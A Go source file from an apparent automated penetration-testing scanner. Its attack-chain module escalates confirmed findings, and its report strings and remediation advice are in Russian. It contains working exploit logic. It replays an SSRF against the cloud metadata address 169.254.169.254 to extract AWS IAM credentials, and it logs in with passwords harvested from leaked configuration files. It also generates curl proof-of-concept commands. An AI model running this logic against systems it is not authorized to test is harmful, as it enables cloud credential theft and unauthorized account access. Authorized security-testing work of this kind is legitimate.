// Package chains correlates already-confirmed findings into attack-path
// chains. It runs after adaptive confirmation, over the now-finalized
// findings in the store. Where a human pentester would look at two confirmed
// findings and think "wait, these compose into something much worse" (SSRF
// that reaches cloud metadata + that metadata returns real keys; a leaked
// password + a login form that accepts it), this package performs one
// additional materialization step to either prove the chain for real or stay
// silent. A chain only becomes a new finding when something genuinely new was
// extracted.
//
// Mirrors modules/chains.py.
package chains

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"time"

	"vectrixgo/internal/adaptive"
	"vectrixgo/internal/crawler"
	"vectrixgo/internal/findings"
	"vectrixgo/internal/httpsession"
	"vectrixgo/internal/logging"
)

// loginPaths mirrors modules/chains.py LOGIN_PATHS.
var loginPaths = []string{
	"/login", "/signin", "/api/login", "/api/signin",
	"/api/auth/login", "/api/auth/token", "/api/token",
	"/api/v1/login", "/api/v2/login", "/auth/local",
}

// ── Generic param-replay ─────────────────────────────────────────────────────

// replayURL mirrors modules/chains.py _replay_url.
func replayURL(rawurl, param, value string) string {
	parsed, err := url.Parse(rawurl)
	if err != nil {
		return rawurl
	}
	q := parsed.Query()
	q.Set(param, value)
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

// replayWithParam mirrors modules/chains.py _replay_with_param.
func replayWithParam(session *httpsession.Session, rawurl, param, value string, timeout time.Duration) *httpsession.Response {
	resp, err := session.Request("GET", replayURL(rawurl, param, value), httpsession.Options{AllowRedirects: false, Timeout: timeout})
	if err != nil {
		return nil
	}
	return resp
}

// ── Rule 1: SSRF -> cloud metadata -> stolen temporary credentials ──────────

var cloudMetadataRe = regexp.MustCompile(`(?i)(aws metadata|azure metadata|gcp metadata|169\.254\.169\.254|metadata\.google\.internal)`)

const awsRoleListURL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

var roleNameRe = regexp.MustCompile(`^([\w.\-]{1,128})\s*$`)

type cloudCredSignature struct {
	pattern *regexp.Regexp
	label   string
}

// cloudCredentialSignatures mirrors modules/chains.py _CLOUD_CREDENTIAL_SIGNATURES.
var cloudCredentialSignatures = []cloudCredSignature{
	{regexp.MustCompile(`"AccessKeyId"\s*:\s*"([^"]+)"`), "AWS AccessKeyId"},
	{regexp.MustCompile(`"SecretAccessKey"\s*:\s*"([^"]+)"`), "AWS SecretAccessKey"},
	{regexp.MustCompile(`"Token"\s*:\s*"([A-Za-z0-9/+=]{20,})"`), "AWS Session Token"},
	{regexp.MustCompile(`"access_token"\s*:\s*"([^"]+)"`), "OAuth/cloud access_token"},
}

type credHit struct {
	label   string
	snippet string
}

// scanForCloudCredentials mirrors modules/chains.py _scan_for_cloud_credentials.
func scanForCloudCredentials(text string) []credHit {
	var hits []credHit
	for _, sig := range cloudCredentialSignatures {
		loc := sig.pattern.FindStringIndex(text)
		if loc == nil {
			continue
		}
		match := text[loc[0]:loc[1]]
		if len(match) > 200 {
			match = match[:200]
		}
		hits = append(hits, credHit{label: sig.label, snippet: match})
	}
	return hits
}

// chainSSRFToCloudCredentials mirrors modules/chains.py _chain_ssrf_to_cloud_credentials.
func chainSSRFToCloudCredentials(session *httpsession.Session, baseURL string, store *findings.FindingStore, endpoints []crawler.Endpoint, artifactRoot string, deepDive, activeExploit, verbose bool) {
	if !deepDive {
		return
	}

	for _, finding := range store.All() {
		if finding.Kind != "ssrf" || finding.Status != "confirmed-deep-dive" {
			continue
		}
		if finding.URL == "" || finding.Parameter == "" {
			continue
		}
		if !cloudMetadataRe.MatchString(finding.Description + "\n" + finding.Evidence) {
			continue
		}

		roleResp := replayWithParam(session, finding.URL, finding.Parameter, awsRoleListURL, 10*time.Second)
		if roleResp == nil || roleResp.StatusCode >= 400 || strings.TrimSpace(roleResp.Body) == "" {
			continue
		}

		credsText := roleResp.Body
		roleName := ""
		lines := strings.Split(strings.TrimSpace(roleResp.Body), "\n")
		firstLine := strings.TrimSpace(lines[0])
		if m := roleNameRe.FindStringSubmatch(firstLine); m != nil {
			roleName = m[1]
			credsResp := replayWithParam(session, finding.URL, finding.Parameter, awsRoleListURL+roleName, 10*time.Second)
			if credsResp != nil && strings.TrimSpace(credsResp.Body) != "" {
				credsText = credsResp.Body
			}
		}

		hits := scanForCloudCredentials(credsText)
		if len(hits) == 0 {
			continue
		}

		relPath, err := adaptive.DumpArtifact(artifactRoot, finding.ID, fmt.Sprintf("cloud_credentials_%s.json", finding.ID), truncate(credsText, 8000))
		if err != nil {
			continue
		}

		targetDesc := awsRoleListURL + roleName

		hitLines := make([]string, 0, len(hits))
		labels := make([]string, 0, len(hits))
		for _, h := range hits {
			hitLines = append(hitLines, fmt.Sprintf("  - %s: %s", h.label, h.snippet))
			labels = append(labels, h.label)
		}

		chain := findings.NewFinding(
			"Цепочка: SSRF → кража временных облачных учётных данных",
			findings.Critical,
			"Attack Chain",
			"CWE-918",
			finding.URL,
			fmt.Sprintf("Базовая находка SSRF [%s] «%s» позволяет серверу "+
				"выполнять исходящие HTTP-запросы по адресу из параметра. Использование этой "+
				"возможности для запроса IAM-метаданных облака (%s) вернуло "+
				"содержимое с распознаваемыми реальными учётными данными:\n%s\n\n"+
				"Это превращает теоретически опасный SSRF в подтверждённую кражу ключей "+
				"доступа к облачной инфраструктуре цели — с ними возможен полноценный "+
				"доступ к ресурсам аккаунта от имени скомпрометированной IAM-роли.",
				finding.ID, finding.Title, targetDesc, strings.Join(hitLines, "\n")),
			fmt.Sprintf("1. Устраните SSRF в параметре '%s' (см. рекомендации находки [%s]).\n"+
				"2. Заблокируйте доступ workload'ов к 169.254.169.254 на сетевом уровне "+
				"(iptables/security groups) или перейдите на IMDSv2 с обязательным токеном.\n"+
				"3. Немедленно отзовите/ротируйте скомпрометированные временные учётные данные "+
				"и проведите аудит активности соответствующей IAM-роли в CloudTrail.",
				finding.Parameter, finding.ID),
			fmt.Sprintf("# Подмена параметра '%s' адресом метаданных облака:\ncurl -s '%s'",
				finding.Parameter, replayURL(finding.URL, finding.Parameter, targetDesc)),
		)
		chain.Evidence = fmt.Sprintf("Извлечённые учётные данные сохранены в артефакт: %s", relPath)
		chain.Parameter = finding.Parameter
		chain.Status = "confirmed-deep-dive"
		chain.Confidence = 1.0
		chain.Kind = "chain"
		chain.VerificationLog = []string{
			fmt.Sprintf("CONFIRMED (chain): повторная отправка SSRF-payload [%s] с адресом "+
				"метаданных IAM (%s) вернула содержимое с сигнатурами реальных "+
				"облачных учётных данных (%s)", finding.ID, targetDesc, strings.Join(labels, ", ")),
		}
		chain.Artifacts = []string{relPath}
		store.Add(chain)
		logging.Printf("  [+] CONFIRMED: %s", chain.Title)
	}
}

// ── Rule 2: leaked credentials -> successful login ───────────────────────────
// Performs a real authentication attempt — gated on activeExploit
// (aggressive only), same philosophy as run_sqlmap.

var usernameRe = regexp.MustCompile(`(?im)^\s*(?:DB_USER(?:NAME)?|ADMIN_USER(?:NAME)?|APP_USER|USERNAME|LOGIN)\s*=\s*["']?([^\s"']+)`)
var passwordRe = regexp.MustCompile(`(?im)^\s*(?:DB_PASSWORD|ADMIN_PASS(?:WORD)?|APP_PASSWORD|PASSWORD|SECRET)\s*=\s*["']?([^\s"']+)`)

var usernameKeyRe = regexp.MustCompile(`(?i)(user(?:name)?|login|email)`)
var passwordKeyRe = regexp.MustCompile(`(?i)(pass(?:word)?|pwd|secret)`)

// extractCredentialPair mirrors modules/chains.py _extract_credential_pair.
func extractCredentialPair(text string) (string, string, bool) {
	userMatch := usernameRe.FindStringSubmatch(text)
	passMatch := passwordRe.FindStringSubmatch(text)
	if userMatch != nil && passMatch != nil {
		return userMatch[1], passMatch[1], true
	}
	return "", "", false
}

// findLoginSurface mirrors modules/chains.py _find_login_surface.
func findLoginSurface(endpoints []crawler.Endpoint) (*crawler.Endpoint, string, string, bool) {
	for i := range endpoints {
		ep := &endpoints[i]
		if !strings.EqualFold(ep.Method, "POST") {
			continue
		}
		params := ep.BodyParams
		if len(params) == 0 {
			params = ep.Params
		}
		keys := make([]string, 0, len(params))
		for k := range params {
			keys = append(keys, k)
		}
		sort.Strings(keys)

		var userKey, passKey string
		for _, k := range keys {
			if userKey == "" && usernameKeyRe.MatchString(k) {
				userKey = k
			}
			if passKey == "" && passwordKeyRe.MatchString(k) {
				passKey = k
			}
		}
		if userKey != "" && passKey != "" {
			return ep, userKey, passKey, true
		}
	}

	for i := range endpoints {
		ep := &endpoints[i]
		if !strings.EqualFold(ep.Method, "POST") {
			continue
		}
		parsed, err := url.Parse(ep.URL)
		if err != nil {
			continue
		}
		path := strings.TrimRight(parsed.Path, "/")
		for _, p := range loginPaths {
			if strings.HasSuffix(path, p) {
				return ep, "username", "password", true
			}
		}
	}

	return nil, "", "", false
}

// chainLeakedCredentialsToLogin mirrors modules/chains.py _chain_leaked_credentials_to_login.
func chainLeakedCredentialsToLogin(session *httpsession.Session, baseURL string, store *findings.FindingStore, endpoints []crawler.Endpoint, artifactRoot string, deepDive, activeExploit, verbose bool) {
	if !activeExploit {
		return
	}

	loginEp, userKey, passKey, ok := findLoginSurface(endpoints)
	if !ok {
		return
	}

	for _, finding := range store.All() {
		if finding.Kind != "disclosure" || finding.Status != "confirmed-deep-dive" || len(finding.Artifacts) == 0 {
			continue
		}

		var username, password string
		found := false
		for _, relPath := range finding.Artifacts {
			data, err := os.ReadFile(filepath.Join(filepath.Dir(artifactRoot), relPath))
			if err != nil {
				continue
			}
			if u, p, ok := extractCredentialPair(string(data)); ok {
				username, password = u, p
				found = true
				break
			}
		}
		if !found {
			continue
		}

		realResp, err := session.PostForm(loginEp.URL, url.Values{userKey: {username}, passKey: {password}}, nil)
		if err != nil {
			if verbose {
				logging.Printf("  [?] цепочка leaked-creds→login: запрос не удался: %v", err)
			}
			continue
		}
		controlResp, err := session.PostForm(loginEp.URL, url.Values{userKey: {"__vsw_" + randomHex(6)}, passKey: {randomHex(32)}}, nil)
		if err != nil {
			if verbose {
				logging.Printf("  [?] цепочка leaked-creds→login: запрос не удался: %v", err)
			}
			continue
		}

		realMarkers := setFromMatches(adaptive.AdminMarkers.FindAllString(realResp.Body, -1))
		controlMarkers := setFromMatches(adaptive.AdminMarkers.FindAllString(controlResp.Body, -1))
		newMarkers := setDifference(realMarkers, controlMarkers)

		statusDiverged := isOneOf(realResp.StatusCode, 200, 301, 302) &&
			!isOneOf(controlResp.StatusCode, 200, 301, 302) &&
			realResp.StatusCode != controlResp.StatusCode

		if len(newMarkers) == 0 && !statusDiverged {
			continue
		}

		proof := fmt.Sprintf("Login URL: %s\nUsername: %s\nPassword: %s\n\n"+
			"--- Ответ на похищенную пару (HTTP %d) ---\n%s\n\n"+
			"--- Контрольный ответ на заведомо неверную пару (HTTP %d) ---\n%s",
			loginEp.URL, username, password, realResp.StatusCode, truncate(realResp.Body, 3000),
			controlResp.StatusCode, truncate(controlResp.Body, 1000))
		relPath, err := adaptive.DumpArtifact(artifactRoot, finding.ID, fmt.Sprintf("login_proof_%s.txt", finding.ID), proof)
		if err != nil {
			continue
		}

		var signal string
		if len(newMarkers) > 0 {
			signal = joinSorted(newMarkers)
		} else {
			signal = fmt.Sprintf("HTTP %d вместо %d у контроля", realResp.StatusCode, controlResp.StatusCode)
		}

		chain := findings.NewFinding(
			"Цепочка: утечка учётных данных → успешный вход в систему",
			findings.Critical,
			"Attack Chain",
			"CWE-522",
			loginEp.URL,
			fmt.Sprintf("Базовая находка раскрытия информации [%s] «%s» содержала "+
				"пару учётных данных (%s:***). Использование этой пары для входа на "+
				"%s прошло успешно — ответ содержит признаки авторизованной сессии "+
				"(%s), отсутствующие в ответе на заведомо неверную (контрольную) пару. "+
				"Это превращает утечку конфигурации в подтверждённый несанкционированный доступ к системе.",
				finding.ID, finding.Title, username, loginEp.URL, signal),
			fmt.Sprintf("1. Немедленно смените скомпрометированные учётные данные и проведите аудит "+
				"активности под этой учётной записью.\n"+
				"2. Устраните источник утечки (см. рекомендации находки [%s]).\n"+
				"3. Включите многофакторную аутентификацию для административных учётных записей.",
				finding.ID),
			fmt.Sprintf("curl -s -X POST '%s' --data '%s=%s&%s=<пароль из артефакта %s>'",
				loginEp.URL, userKey, username, passKey, relPath),
		)
		chain.Evidence = fmt.Sprintf("Доказательство успешного входа сохранено: %s", relPath)
		chain.Parameter = userKey
		chain.Method = "POST"
		chain.Status = "confirmed-deep-dive"
		chain.Confidence = 1.0
		chain.Kind = "chain"
		chain.VerificationLog = []string{
			fmt.Sprintf("CONFIRMED (chain): пара учётных данных из находки [%s] прошла "+
				"дифференциальную проверку входа на %s — успешный ответ содержит "+
				"маркеры/код состояния, отсутствующие в ответе на контрольную (заведомо неверную) пару",
				finding.ID, loginEp.URL),
		}
		chain.Artifacts = []string{relPath}
		store.Add(chain)
		logging.Printf("  [+] CONFIRMED: %s", chain.Title)
		return
	}
}

// ── Helpers ───────────────────────────────────────────────────────────────────

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

func setFromMatches(matches []string) map[string]struct{} {
	s := make(map[string]struct{}, len(matches))
	for _, m := range matches {
		s[m] = struct{}{}
	}
	return s
}

func setDifference(a, b map[string]struct{}) map[string]struct{} {
	out := make(map[string]struct{})
	for k := range a {
		if _, ok := b[k]; !ok {
			out[k] = struct{}{}
		}
	}
	return out
}

func joinSorted(set map[string]struct{}) string {
	keys := make([]string, 0, len(set))
	for k := range set {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	return strings.Join(keys, ", ")
}

func isOneOf(v int, options ...int) bool {
	for _, o := range options {
		if v == o {
			return true
		}
	}
	return false
}

func randomHex(n int) string {
	b := make([]byte, (n+1)/2)
	rand.Read(b)
	return hex.EncodeToString(b)[:n]
}

// ── Rule registry & entrypoint ────────────────────────────────────────────────

type chainRule struct {
	name string
	fn   func(session *httpsession.Session, baseURL string, store *findings.FindingStore, endpoints []crawler.Endpoint, artifactRoot string, deepDive, activeExploit, verbose bool)
}

// chainRules mirrors modules/chains.py CHAIN_RULES.
var chainRules = []chainRule{
	{"chain_ssrf_to_cloud_credentials", chainSSRFToCloudCredentials},
	{"chain_leaked_credentials_to_login", chainLeakedCredentialsToLogin},
}

// RunChainAnalysis runs every chain rule over the finalized findings in
// store. Mirrors modules/chains.py run_chain_analysis.
func RunChainAnalysis(session *httpsession.Session, baseURL string, store *findings.FindingStore, endpoints []crawler.Endpoint, artifactRoot string, deepDive, activeExploit, verbose bool) {
	before := store.Len()

	for _, rule := range chainRules {
		func() {
			defer func() {
				if r := recover(); r != nil {
					logging.Printf("  [!] анализ цепочек (%s): %v", rule.name, r)
				}
			}()
			rule.fn(session, baseURL, store, endpoints, artifactRoot, deepDive, activeExploit, verbose)
		}()
	}

	built := store.Len() - before
	if built > 0 {
		logging.Printf("[+] Анализ цепочек атак завершён: построено и подтверждено цепочек — %d", built)
	} else {
		logging.Println("[+] Анализ цепочек атак завершён: подтверждённых цепочек не найдено")
	}
}
